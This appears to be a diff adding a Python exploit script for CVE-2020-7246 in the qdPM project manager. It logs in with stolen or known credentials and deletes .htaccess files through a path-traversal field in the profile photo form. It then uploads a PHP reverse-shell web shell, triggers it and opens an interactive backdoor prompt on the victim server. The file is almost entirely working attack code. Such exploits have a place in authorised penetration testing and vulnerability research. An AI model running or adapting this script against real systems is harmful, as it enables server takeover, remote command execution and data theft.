@@ -1,0 +1,183 @@
+#!/usr/bin/python
+
+#-------------------------------------------------------------------------------------
+# Title:	qdPM Webshell Upload + RCE Exploit (qdPMv9.1 and below) (CVE-2020-7246)
+# Author:	Tobin Shields (@TobinShields)
+#
+# Description:	This is an exploit to automatically upload a PHP web shell to
+#				the qdPM platform via the "upload a profile photo" feature.
+#				This method also bypasses the fix put into place from a previous CVE
+#
+# Usage:		In order to leverage this exploit, you must know the credentials of
+#				at least one user. Then, you should modify the values highlighted below.
+#				You will also need a .php web shell payload to upload. This exploit
+#				was built and tested using the PHP script built by pentestmonkey:
+#				https://github.com/pentestmonkey/php-reverse-shell
+#-------------------------------------------------------------------------------------
+
+# Imports
+from requests import Session
+from bs4 import BeautifulSoup as bs
+import socket
+from multiprocessing import Process
+import time
+
+# CHANGE THESE VALUES-----------------------------------------------------------------
+login_url = "http://[victim_domain]/path/to/qdPM/index.php/login"
+username = "jsmith@example.com"
+password = "Pa$$w0rd"
+payload = "/path/to/payload.php"
+listner_port = 1234 			# This should match your PHP payload
+connection_delay = 2 			# Increase this value if you have a slow connection and are experiencing issues
+# ------------------------------------------------------------------------------------
+
+# Build the myAccout URL from the provided URL
+myAccount_url = login_url.replace("login", "myAccount")
+
+# PROGRAM FUNCTIONS -----------------------------------------------------------------
+# Utility function for anytime a page needs to be requested and parsed via bs4
+def requestAndSoupify(url):
+	page = s.get(url)
+	soup = bs(page.content, "html.parser")
+	return soup
+
+# Function to log into the application, and supply the correct username/password
+def login(url):
+	# Soupify the login page
+	login_page = requestAndSoupify(url)
+	# Grab the csrf token
+	token = login_page.find("input", {"name": "login[_csrf_token]"})["value"]
+	# Build the POST values
+	login_data = {
+		"login[email]": username,
+		"login[password]": password,
+		"login[_csrf_token]": token
+	}
+	# Send the login request
+	s.post(login_url, login_data)
+
+# Function to get the base values for making a POST request from the myAccount page
+def getPOSTValues():
+	myAccount_soup = requestAndSoupify(myAccount_url)
+	# Search for the 'base' POST data needed for any requests
+	u_id 	= myAccount_soup.find("input", {"name": "users[id]"})["value"]
+	token 	= myAccount_soup.find("input", {"name": "users[_csrf_token]"})["value"]
+	u_name 	= myAccount_soup.find("input", {"name": "users[name]"})["value"]
+	u_email = myAccount_soup.find("input", {"name": "users[email]"})["value"]
+	# Populate the POST data object
+	post_data = {
+		"users[id]": u_id,
+		"users[_csrf_token]": token,
+		"users[name]": u_name,
+		"users[email]": u_email,
+		"users[culture]": "en" # Keep the language English--change this for your victim locale
+	}
+	return post_data
+
+# Function to remove the a file from the server by exploiting the CVE
+def removeFile(file_to_remove):
+	# Get base POST data
+	post_data = getPOSTValues()
+	# Add the POST data to remove a file
+	post_data["users[photo_preview]"] = file_to_remove
+	post_data["users[remove_photo]"] = 1
+	# Send the POST request to the /update page
+	s.post(myAccount_url + "/update", post_data)
+	# Print update to user
+	print("Removing " + file_to_remove)
+	# Sleep to account for slow connections
+	time.sleep(connection_delay)
+
+# Function to upload the payload to the server
+def uploadPayload(payload):
+	# Get payload name from supplied URI
+	payload_name = payload.rsplit('/', 1)[1]
+	# Request page and get base POST files
+	post_data = getPOSTValues()
+	# Build correct payload POST header by dumping the contents
+	payload_file = {"users[photo]": open(payload, 'rb')}
+	# Send POST request with base data + file
+	s.post(myAccount_url + "/update", post_data, files=payload_file)
+	# Print update to user
+	print("Uploading " + payload_name)
+	# Sleep for slow connections
+	time.sleep(connection_delay)
+
+# A Function to find the name of the newly uploaded payload
+	# NOTE: We have to do this because qdPM adds a random number to the uploaded file
+	# EX: webshell.php becomes 1584009-webshell.php
+def getPayloadURL():
+	myAccount_soup = requestAndSoupify(myAccount_url)
+	payloadURL = myAccount_soup.find("img", {"class": "user-photo"})["src"]
+	return payloadURL
+
+# Function to handle creating the webshell listener and issue commands to the victim
+def createBackdoorListener():
+	# Set up the listening socket on localhost
+	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	host = "0.0.0.0"
+	port = listner_port # Specified at the start of this script by user
+	server_socket.bind((host, port))
+	server_socket.listen(2)
+	victim, address = server_socket.accept()
+	# Print update to user once the connection is made
+	print("Received connection from: " + str(address))
+
+	# Simulate a terminal and build a pusdo-prompt using the victem IP
+	prompt = "backdoor@" + str(address[0]) + ":~$ "
+
+	# Grab the first response from the victim--this is usually OS info
+	response = victim.recv(1024).decode('utf-8')
+	print(response)
+	print("\nType 'exit' at any time to close the connection")
+
+	# Maintain the connection and send data back and forth
+	while True:
+		# Grab the command from the user
+		command = input(prompt)
+		# If they type "exit" then close the socket
+		if 'exit' in command:
+			victim.close()
+			server_socket.close()
+			print("Disconnecting, please wait...")
+			break
+		# For all other commands provided
+		else:
+			# Encode the command to be properly sent via the socket & send the command
+			command = str.encode(command + "\n")
+			victim.send(command)
+			# Grab the response to the command and decode it
+			response = victim.recv(1024).decode('utf-8')
+			# For some odd reason you have to hit "enter" after sending the command to receive the output
+			# TODO: Fix this so it works on a single send? Although it might just be the PHP webshell
+			victim.send(str.encode("\n"))
+			response = victim.recv(1024).decode('utf-8')
+			# If a command returns nothing (i.e. a 'cd' command, it prints a "$"
+			# This is a confusing output so it will omit this output
+			if response.strip() != "$":
+				print(response)
+
+# Trigger the PHP to run by making a page request
+def triggerShell(s, payloadURL):
+	pageReq = s.get(payloadURL)
+
+# MAIN FUNCTION ----------------------------------------------------------------------
+# The main function of this program establishes a unique session to issue the various POST requests
+with Session() as s:
+	# Login as know user
+	login(login_url)
+	# Remove Files
+		# You may need to modify this list if you suspect that there are more .htaccess files
+		# However, the default qdPM installation just had these two
+	files_to_remove = [".htaccess", "../.htaccess"]
+	for f in files_to_remove:
+		removeFile(f)
+	# Upload payload
+	uploadPayload(payload)
+	# Get the payload URL
+	payloadURL = getPayloadURL()
+	# Start a thread to trigger the script with a web request
+	process = Process(target=triggerShell, args=(s, payloadURL))
+	process.start()
+	# Create the backdoor listener and wait for the above request to trigger
+	createBackdoorListener()
